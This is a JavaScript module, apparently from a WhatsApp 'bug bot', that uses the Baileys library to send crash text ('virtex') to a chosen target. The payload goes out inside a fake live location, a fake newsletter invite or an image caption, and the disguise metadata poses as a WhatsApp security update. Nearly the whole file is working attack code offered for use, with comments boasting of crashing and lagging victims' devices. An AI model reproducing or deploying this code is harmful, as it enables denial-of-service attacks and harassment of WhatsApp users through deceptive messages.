/*
€ Creator: GHOST DESTRO
€ Base: SKY VOID V10
©2026 - GHOST DESTRO PREMIUM EXPLOIT (ZERO TRACE)
*/

const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const fs = require('fs');

async function sendBug(sock, jid, type, payload) {
    // === SETUP AMUNISI (JANGAN DIUBAH NAMA FILENYA, ASU!) ===
    const fileVirus1 = './VIRUS LAG BY GHOSTNAME.txt';
    const fileVirus2 = './VirusPending+Legh.txt';
    
    let peluruMaut = "";

    try {
        // Sedot kekuatan dari dua file virus lu
        const data1 = fs.existsSync(fileVirus1) ? fs.readFileSync(fileVirus1, 'utf-8') : "";
        const data2 = fs.existsSync(fileVirus2) ? fs.readFileSync(fileVirus2, 'utf-8') : "";
        
        // Gabungin jadi satu serangan mematikan
        peluruMaut = data1 + "\n\n" + data2;

        // Kalau file kosong, pake cadangan biar tetep crash
        if (peluruMaut.trim().length < 10) {
            peluruMaut = "🔱 GHOST_DESTRO_VOID_FATAL_ERROR_0x889_BYPASS_RAM 🔱".repeat(500);
        }
    } catch (err) {
        console.log("⚠️ [WARNING] Gagal nyedot file virus, asu! Cek nama filenya!");
    }

    // === METADATA SAMARAN (OFFICIAL LOOK) ===
    const meta = {
        locName: "🔱 SYSTEM_FATAL_ERROR_0x889 🔱",
        newsName: "⚠️ WHATSAPP_SECURITY_UPDATE ⚠️",
        imgTitle: "🔱 KERNEL_PANIC_STACK_OVERFLOW 🔱",
        officialLink: "https://www.whatsapp.com/security" // Gak ada nomor lu, aman sky!
    };

    try {
        if (type === 'DELAY') { 
            // 1. FAKE LOKASI + COMBO VIRTEX
            await sock.relayMessage(jid, {
                locationMessage: {
                    degreesLatitude: -6.175,
                    degreesLongitude: 106.865,
                    name: meta.locName, 
                    address: peluruMaut, // VIRUS MASUK KE ALAMAT LOKASI
                    isLive: true
                }
            }, { messageId: sock.generateMessageTag() });

        } else if (type === 'NEWSLETTER') { 
            // 2. FAKE NEWSLETTER + COMBO VIRTEX
            await sock.relayMessage(jid, {
                newsletterInviteLinkMessage: {
                    inviteLink: "https://whatsapp.com/channel/0029Va4KbjD8F2pG",
                    caption: peluruMaut, // VIRUS MASUK KE CAPTION NEWSLETTER
                    name: meta.newsName 
                }
            }, { messageId: sock.generateMessageTag() });

        } else if (type === 'BLANK' || type === 'JPG_VIR') { 
            // 3. BUGIMAGE.JPG + COMBO VIRTEX
            await sock.sendMessage(jid, {
                image: { url: "https://telegra.ph/file/a613248356973305a764c.jpg" },
                caption: peluruMaut, // VIRUS MASUK KE CAPTION GAMBAR
                mimetype: 'image/jpeg',
                fileName: 'bugimage.jpg', // NAMA FILE SESUAI REQUEST LU
                contextInfo: {
                    externalAdReply: {
                        title: meta.imgTitle,
                        body: "STATUS: CRITICAL_FAILURE",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        sourceUrl: meta.officialLink
                    }
                }
            });
        }
        
        console.log(`\x1b[1;32m[SUCCES]\x1b[0m Peluru Maut ${type} Berhasil Mendarat di ${jid}, ASU!`);
    } catch (e) {
        console.log(`\x1b[1;31m[ERROR]\x1b[0m Engine Gagal Nembak: ${e}`);
    }
}

module.exports = { sendBug };
